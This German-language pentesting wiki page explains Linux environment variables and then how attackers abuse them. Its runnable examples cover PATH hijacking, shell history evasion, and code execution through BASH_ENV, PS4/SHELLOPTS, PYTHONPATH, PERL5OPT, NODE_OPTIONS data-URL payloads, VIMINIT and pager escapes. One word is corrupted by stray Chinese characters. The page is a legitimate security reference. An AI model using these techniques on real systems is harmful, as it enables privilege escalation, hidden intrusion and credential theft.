# Linux-Umgebungsvariablen

{{#include ../../banners/hacktricks-training.md}}

## Globale Variablen

Die globalen Variablen werden von **Kindprozessen** geerbt.

Du kannst eine globale Variable für deine aktuelle Sitzung erstellen, indem du Folgendes ausführst:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Diese Variable ist in Ihren aktuellen Sitzungen und deren Kindprozessen verfügbar.

Sie können eine Variable wie folgt **entfernen**:

```bash
unset MYGLOBAL
```

## Lokale Variablen

Auf **lokale Variablen** kann nur von der **aktuellen Shell/dem aktuellen Skript** aus **zugegriffen** werden.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Aktuelle Variablen auflisten

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Die Inhalte von `/proc/*/environ` sind **durch NUL-Bytes getrennt**, daher lassen sich diese Varianten meist leichter lesen:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Wenn du in geerbten Umgebungen nach **credentials** oder **interessanten Service-Konfigurationen** suchst, sieh dir auch [Linux Post Exploitation](../post-exploitation/README.md) an.

## Häufige Variablen

Quelle: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – das von **X** verwendete Display. Diese Variable ist üblicherweise auf **:0.0** gesetzt, was das erste Display auf dem aktuellen Computer bezeichnet.
- **EDITOR** – der bevorzugte Texteditor des Benutzers.
- **HISTFILESIZE** – die maximale Anzahl von Zeilen in der History-Datei.
- **HISTSIZE** – Anzahl der Zeilen, die der History-Datei hinzugefügt werden, wenn der Benutzer seine Sitzung beendet
- **HOME** – dein Home-Verzeichnis.
- **HOSTNAME** – der Hostname des Computers.
- **LANG** – deine aktuelle Sprache.
- **MAIL** – der Speicherort des Mail-Spools des Benutzers. Üblicherweise **/var/spool/mail/USER**.
- **MANPATH** – die Liste der Verzeichnisse, in denen nach Handbuchseiten gesucht wird.
- **OSTYPE** – der Typ des Betriebssystems.
- **PS1** – der Standard-Prompt in bash.
- **PATH** – speichert die Pfade aller Verzeichnisse, die ausführbare Dateien enthalten, die du ausführen möchtest, indem du nur den Dateinamen angibst und keinen relativen oder absoluten Pfad.
- **PWD** – das aktuelle Arbeitsverzeichnis.
- **SHELL** – der Pfad zur aktuellen Command Shell (zum Beispiel **/bin/bash**).
- **TERM** – der aktuelle Terminaltyp (zum Beispiel **xterm**).
- **TZ** – deine Zeitzone.
- **USER** – dein aktueller Benutzername.

## Interessante Variablen für Hacking

Nicht jede Variable ist gleich nützlich. Aus offensiver Sicht solltest du Variablen priorisieren, die **Suchpfade**, **Startdateien**, das Verhalten des **Dynamic Linkers** oder **Audit/Logging** beeinflussen.

### **HISTFILESIZE**

Ändere den **Wert dieser Variable auf 0**, damit die **History-Datei** (\~/.bash_history) beim **Beenden deiner Sitzung** auf **0 Zeilen** gekürzt wird.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Ändere den **Wert dieser Variable auf 0**, damit Befehle **nicht im Verlauf im Arbeitsspeicher gespeichert** und nicht in die **Verlaufsdatei** (\~/.bash_history) geschrieben werden.

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Wenn **der Wert dieser Variable auf `ignorespace` oder `ignoreboth` gesetzt ist**, wird jeder Befehl, dem ein zusätzliches Leerzeichen vorangestellt wird, nicht im Verlauf gespeichert.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Setze die **Verlaufsdatei** auf **`/dev/null`** oder hebe die Variable vollständig auf. Das ist in der Regel zuverlässiger, als nur die Größe des Verlaufs zu ändern.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Die Prozesse verwenden den hier angegebenen **Proxy**, um über **HTTP oder HTTPS** eine Verbindung zum Internet herzustellen.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: Standard-Proxy für Tools/Protokolle, die diese Variable berücksichtigen.
- `no_proxy`: Umgehungsliste (Hosts/Domains/CIDRs), für die direkt eine Verbindung hergestellt werden soll.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Sowohl Klein- als auch Großbuchstabenvarianten können je nach Tool verwendet werden (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Die Prozesse vertrauen den in **diesen Umgebungsvariablen** angegebenen Zertifikaten. Das ist nützlich, damit Tools wie **`curl`**, **`git`**, Python-HTTP-Clients oder Paketmanager einer vom Angreifer kontrollierten CA vertrauen (zum Beispiel, damit ein Interception-Proxy legitim wirkt).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Wenn ein privilegierter Wrapper oder ein Script Befehle **ohne absolute Pfade** ausführt, wird das **erste vom Angreifer kontrollierte Verzeichnis** in `PATH` verwendet. Das ist die Grundlage vieler **PATH-Hijacks** in `sudo`, Cron-Jobs, Shell-Wrappern und benutzerdefinierten SUID-Helfern. Achte auf `env_keep+=PATH`, einen schwachen `secure_path` oder Wrapper, die `tar`, `service`, `cp`, `python` usw. über ihren Namen aufrufen.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Für vollständige Privilege-Escalation-Ketten, die `PATH` ausnutzen, siehe [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` ist nicht nur ein Verzeichnisverweis: Viele Tools laden automatisch **Dotfiles**, **Plugins** und **benutzerspezifische Konfigurationen** aus `$HOME` oder `$XDG_CONFIG_HOME`. Wenn ein privilegierter Workflow diese Werte beibehält, kann **Config Injection** einfacher sein als Binary Hijacking.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Interessante Ziele sind `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` und toolspezifische Dateien wie `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Diese Variablen beeinflussen den **dynamic linker**:

- `LD_PRELOAD`: erzwingt, dass zusätzliche Shared Objects zuerst geladen werden.
- `LD_LIBRARY_PATH`: stellt Verzeichnisse an den Anfang der Bibliothekssuche.
- `LD_AUDIT`: lädt Auditor-Bibliotheken, die das Laden von Bibliotheken und die Symbolauflösung beobachten.

Sie sind äußerst wertvoll für **hooking**, **instrumentation** und **privilege escalation**, wenn ein privilegierter Befehl sie beibehält. Im **secure-execution**-Modus (`AT_SECURE`, z. B. setuid/setgid/capabilities) entfernt oder beschränkt der Loader viele dieser Variablen. Parser-Bugs in dieser frühen Loader-Phase haben jedoch weiterhin schwerwiegende Auswirkungen, da sie **vor** dem Zielprogramm ausgeführt werden.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` ändert das frühe Verhalten von glibc (zum Beispiel Allocator-Tunables) und ist in Exploit-Labs sehr nützlich. Die Variable ist auch aus Sicherheitssicht relevant, weil der **dynamische Loader sie sehr früh parst**. Der **Looney-Tunables**-Bug von 2023 erinnerte daran, dass eine einzelne im Loader geparste Umgebungsvariable zu einer **lokalen Privilegieneskalationsprimitive** für SUID-Programme werden kann.<sup>[[6]](#references)</sup>

Für CVE-2023-4911 solltest du die **installierte Distributionspaketversion** mit der vom Hersteller korrigierten Version vergleichen und überprüfen, welcher Loader tatsächlich für neue Prozesse verwendet wird. Eine Upstream-Versionszeichenfolge allein ist unzuverlässig: Debian hat den anfälligen Parser in sein 2.31-Paket zurückportiert, während Distributionen Korrekturen zurückportiert haben, ohne die Upstream-Nummer zu ändern. Für einen tatsächlichen Privilegienwechsel braucht es außerdem ein ausführbares privilegiertes Ziel, dessen Identitätswechsel nicht durch `NoNewPrivs`, einen `nosuid`-Mount oder eine andere Mitigation verhindert wird. Vermeide es, bei einer passiven Enumeration eine fehlerhafte `GLIBC_TUNABLES`-Abfrage auszuführen, die einen Absturz verursachen kann. Informationen zur Gültigkeit für bestimmte Releases findest du im [Ubuntu-Tracker](https://ubuntu.com/security/CVE-2023-4911), im [Debian-Tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911) und in der [Red-Hat-Sicherheitsempfehlung](https://access.redhat.com/security/cve/cve-2023-4911); außerdem empfiehlt Ubuntus [Sicherheitshinweis](https://ubuntu.com/security/notices/USN-6409-1) nach dem Update einen Neustart.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Wenn **Bash** **nicht-interaktiv** gestartet wird, prüft es `BASH_ENV` und lädt diese Datei, bevor es das Zielskript ausführt. Wird Bash als `sh` oder im interaktiven POSIX-Modus aufgerufen, kann auch `ENV` berücksichtigt werden. Auf diese klassische Weise kann ein Shell-Wrapper zur Codeausführung führen, wenn die Umgebung vom Angreifer kontrolliert wird.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash ignoriert diese Startdateien, wenn die **realen/effektiven IDs unterschiedlich sind**; `-p` behält die effektive ID bei, aktiviert diese Startdateien jedoch nicht. Das genaue Verhalten hängt also davon ab, wie der Wrapper die Shell aufruft. Vorsicht bei privilegierten Wrappern, die vor dem Start von Bash `setuid()`/`setgid()` aufrufen: Sobald die IDs wieder übereinstimmen, vertraut Bash möglicherweise `BASH_ENV`, `ENV` und verwandlichem Shell-Zustand, die andernfalls ignoriert würden.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Wenn Bash mit aktiviertem **xtrace** ausgeführt wird, expandiert es `PS4` und gibt den Wert vor jedem nachverfolgten Befehl aus. `PS4` wird wie ein Prompt expandiert, daher wird eine darin enthaltene **command substitution** ausgeführt. Entscheidend ist, dass xtrace allein über die Umgebung aktiviert werden kann, indem `SHELLOPTS=xtrace` exportiert wird — `-x` in der Befehlszeile ist nicht erforderlich. Dadurch wird jedes Bash-Skript, das das Opfer ausführt, zur Codeausführung.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` bewirkt nichts, bis xtrace aktiv ist (`SHELLOPTS=xtrace`, `set -x` oder `bash -x`). In privilegierten/setuid-Kontexten verwirft Bash `SHELLOPTS` ebenso wie `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Diese Variablen ändern, wie Python gestartet wird:

- `PYTHONPATH`: Import-Suchpfade voranstellen.
- `PYTHONHOME`: den Verzeichnisbaum der Standardbibliothek verlegen.
- `PYTHONSTARTUP`: eine Datei vor der interaktiven Eingabeaufforderung ausführen.
- `PYTHONINSPECT=1`: nach Abschluss eines Skripts in den interaktiven Modus wechseln.
- `PYTHONBREAKPOINT`: `package.module.callable` wird aufgerufen (und das Modul importiert), wenn der Code `breakpoint()` erreicht.<sup>[[8]](#references)</sup>

Sie sind nützlich bei Wartungsskripten, Debuggern, Shells und Wrappers, die Python mit einer kontrollierbaren Umgebung aufrufen. `python -E` und `python -I` ignorieren alle `PYTHON*`-Variablen.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Ein aktuelles Beispiel aus der Praxis war die **needrestart**-LPE von 2024 auf Ubuntu-/Debian-Systemen: Der root-eigene Scanner kopierte die `PYTHONPATH` eines unprivilegierten Prozesses aus `/proc/<PID>/environ` und führte anschließend Python aus. Beim veröffentlichten Exploit wurde `importlib/__init__.so` im vom Angreifer kontrollierten Pfad platziert, sodass Python während seiner eigenen Initialisierung Angreifercode ausführte, noch bevor das fest codierte Skript des Hilfsprogramms überhaupt relevant wurde.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl verfügt über ähnlich nützliche Startvariablen:

- `PERL5LIB`: Bibliotheksverzeichnisse voranstellen.
- `PERL5OPT`: Schalter einschleusen, als stünden sie auf jeder `perl`-Befehlszeile.

Damit lässt sich **automatisches Laden von Modulen** erzwingen oder das Verhalten des Interpreters ändern, bevor das Zielskript etwas Interessantes tut. Perl ignoriert diese Variablen in **taint- / setuid- / setgid**-Kontexten, aber bei gewöhnlichen, als root ausgeführten Wrappern, CI-Jobs, Installern und benutzerdefinierten sudoers-Regeln sind sie weiterhin sehr relevant.

Wenn eine sudo-Regel Umgebungsüberschreibungen zulässt und der privilegierte Befehl letztlich Perl startet, solltest du auch `PERL5DB` prüfen. Perl dokumentiert, dass `PERL5OPT=-d` den Debugger startet und `PERL5DB` den Initialisierungscode für den Debugger bereitstellt, wenn Perl mit einem alleinstehenden `-d`-Schalter startet. Nur `PERL5LIB` und `PERLLIB` zu entfernen, beseitigt diesen Angriffsweg nicht. Die Variablen müssen sudo und den Wrapper überstehen, und der Perl-Prozess darf sie nicht aufgrund von taint- oder set-ID-Behandlung ignorieren; prüfe bei der Enumeration die genaue Regel und Ausführungskette, ohne das privilegierte Hilfsprogramm auszuführen. Siehe die Referenz zu Umgebungsvariablen in [perlrun](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Der eingebaute [`@INC`-Suchpfad](https://perldoc.perl.org/perlvar#@INC) von Perl ist auch ohne übergebene Umgebungsvariablen eine weitere Vertrauensgrenze für Module. Prüfe bei einem privilegierten Perl-Prozess, ob eine tatsächliche `use`- oder `require`-Anweisung mit dem aufgelösten Modulnamen und der Suchreihenfolge zusammenpasst und ob ein Benutzer mit geringeren Berechtigungen dieses Modul in einem durchsuchten Verzeichnis erstellen oder ersetzen kann. Ein beschreibbares Bibliotheksverzeichnis allein belegt nicht, dass der privilegierte Prozess daraus Code laden wird.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` stellt **Node.js CLI flags** allen `node`-Prozessen voran, die die Umgebung erben. Dadurch ist die Variable nützlich bei Wrappers, CI-Jobs, Electron-Hilfsprogrammen und sudo-Regeln, die letztlich Node aufrufen. Die offensiv interessantesten Flags sind in der Regel:

- `--require <file>`: Lädt eine CommonJS-Datei vor dem Ziels此同时skript.
- `--import <module>`: Lädt ein ES-Modul vor dem Ziels此同时skript.

Node weist einige gefährliche Flags in `NODE_OPTIONS` zurück, aber `--require` und `--import` sind ausdrücklich erlaubt und werden **vor** den regulären Befehlszeilenargumenten verarbeitet.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Fileless-Preload mit einer `data:`-URL

Wenn du `NODE_OPTIONS` setzen kannst, aber **keine Datei** auf dem Zielsystem schreiben kannst (schreibgeschütztes Dateisystem, eingeschränkte API, serverlose Laufzeitumgebung usw.), akzeptiert `--import` eine `data:text/javascript,`-URL. Dadurch wird die gesamte Payload in der Umgebungsvariable selbst übertragen. Das JavaScript muss **vollständig URL-kodiert** sein – Node interpretiert den Wert als URL, sodass jedes nicht kodierte Leerzeichen (oder andere nicht kodierte Zeichen) die Payload abschneidet und einen `SyntaxError` auslöst. Dies funktioniert ab Node 20.6, wo `--import` auf der `NODE_OPTIONS`-Allowlist steht.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Dies ist eine gängige Methode, um `NODE_OPTIONS`-Kontrolle in RCE auf **verwalteten Cloud-Runtimes** umzuwandeln, deren Funktionen Node ausführen. Beispielsweise kann ein Angreifer, der nur die Konfiguration einer Lambda-Funktion ändern kann (`lambda:UpdateFunctionConfiguration`, kein `iam:PassRole`, kein Code-Update), `NODE_OPTIONS=--import data:text/javascript,<payload>` injizieren, um Code innerhalb der Funktion auszuführen und deren Execution-Role-Credentials zu stehlen. Das injizierte Modul wird **vor** dem Handler ausgeführt, der danach weiterhin normal läuft.

Informationen zu Remote-Gadget-Chains, die `NODE_OPTIONS` indirekt setzen (zum Beispiel durch Prototype Pollution zu RCE), finden Sie auf [dieser anderen Seite](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby bietet dieselbe Klasse von Startup-Missbrauchsmöglichkeiten:

- `RUBYLIB`: Ruby's Load-Path Verzeichnisse voranstellen.
- `RUBYOPT`: Kommandozeilenoptionen wie `-r` in jeden `ruby`-Aufruf injizieren.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Die Schwachstellen in **needrestart** aus dem Jahr 2024 zeigten, dass dies nicht nur ein Lab-Trick ist: Derselbe root-eigene Helfer, der für `PYTHONPATH`-Missbrauch anfällig war, konnte auch dazu gebracht werden, Ruby mit einem vom Angreifer kontrollierten `RUBYLIB` auszuführen und `enc/encdb.so` aus einem Angreiferverzeichnis zu laden.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim führen die in `VIMINIT` (oder dessen Fallback `EXINIT`) enthaltenen Ex-Befehle beim normalen Start aus. Zu den Ex-Befehlen gehören `:!cmd` und `:call system(...)`. Wer die Variable kontrolliert, kann daher Code ausführen, sobald ein Opfer Vim öffnet (etwa mit `sudo vim` als root, `crontab -e`, `visudo` oder wenn `git`/`less` `$EDITOR` startet).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Der Batch-Modus (`vim -es`/`-Es`) überspringt diese Variablen, beim normalen interaktiven Start werden sie jedoch ausgeführt.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) läuft unter Linux/macOS (und Windows) und ist eine **.NET-Anwendung**. Daher können mehrere Umgebungsvariablen jede `pwsh`-Ausführung mit einer geerbten Umgebung zur Codeausführung nutzen – nützlich gegen cron-/systemd-Jobs, CI-Runner und privilegierte Wrapper, die `pwsh` aufrufen.

- `PSModulePath`: PowerShell durchsucht rekursiv jedes Verzeichnis in dieser Liste nach `.psd1`-/`.psm1`-Modulen und **lädt sie automatisch**, sobald erstmals auf einen von ihnen exportierten Befehl verwiesen wird. Füge ein Verzeichnis am Anfang der Liste ein, und der Top-Level-Code deines Moduls wird beim Import ausgeführt. Da die Auflösung nach *Alias → Function → Cmdlet* erfolgt, kann eine exportierte Funktion sogar ein integriertes Cmdlet überschreiben, das das Opfer aufruft.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: verschiebt `powershell/Microsoft.PowerShell_profile.ps1`, das beim Start ausgeführt wird (außer bei `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: verwaltete Assembly, deren `StartupHook.Initialize()` vor `Main` ausgeführt wird (wird von jeder .NET-App verwendet).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: Die CLR Profiling API lädt beim Start eine Angreiferbibliothek in den Prozess (Pfadvariablen haben Vorrang vor der Registry; `DOTNET_*` ist der neuere Alias). Verwende unter Windows PowerShell 5.1 (.NET Framework) `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Unter Windows hebt `PSExecutionPolicyPreference=Bypass` zusätzlich die Schutzmaßnahme „unsigned scripts blocked“ auf, sodass ein platzierter Profileintrag/ein platziertes Modul tatsächlich ausgeführt wird. Eine eigene Seite enthält die vollständigen PoCs:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Einige Tools lesen nicht einfach nur einen Pfad aus der Umgebung aus, sondern übergeben den Wert an eine **shell**, einen **Editor** oder einen **Eingabevorverarbeiter**. Dadurch sind die folgenden Variablen besonders interessant, wenn ein privilegierter Wrapper `git`, `man`, `less` oder ähnliche Textbetrachter ausführt:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: Legen den Pager-Befehl fest.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: Legen den Editor-Befehl fest, oft mit Argumenten.
- `LESSOPEN`, `LESSCLOSE`: Definieren Vor-/Nachbearbeiter, die beim Öffnen einer Datei durch `less` ausgeführt werden.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git unterstützt außerdem **env-only config injection**, ohne auf die Festplatte zu schreiben, über `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` und `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Aus der Perspektive der Post-Exploitation solltest du außerdem bedenken, dass geerbte Umgebungen oft **Anmeldedaten**, **Proxy-Einstellungen**, **Service-Tokens** oder **Cloud-Schlüssel** enthalten. Sieh dir [Linux Post Exploitation](../post-exploitation/README.md) an, um nach `/proc/<PID>/environ` und `systemd`-`Environment=` zu suchen.

### PS1

Ändere das Aussehen deines Prompts.

[**Dies ist ein Beispiel**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Dies ist ein Beispiel](<../images/image (897).png>)

Normaler Benutzer:

![PERL5OPT & PERL5LIB - PS1: Ein, zwei und drei Hintergrund-Jobs](<../images/image (740).png>)

Ein, zwei und drei Hintergrund-Jobs:

![PERL5OPT & PERL5LIB - PS1: Ein, zwei und drei Hintergrund-Jobs](<../images/image (145).png>)

Ein Hintergrund-Job, ein angehaltener Job und der letzte Befehl wurde nicht korrekt beendet:

![PERL5OPT & PERL5LIB - PS1: Ein Hintergrund-Job, ein angehaltener Job und der letzte Befehl wurde nicht korrekt beendet](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Bash-Startdateien](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux-Manpage](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js-CLI-Dokumentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Gängige Umgebungsvariablen - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - lokale Rechteausweitung in glibcs ld.so - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash Manual - Bash-Variablen (`PS4`) und der Set-Builtin-Befehl (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Integrierter Befehl breakpoint() und PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim-Dokumentation - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath und automatisches Laden von PowerShell-Modulen](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Konfigurationseinstellungen für .NET-Debugging und -Profiling (Profiler-Variablen `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
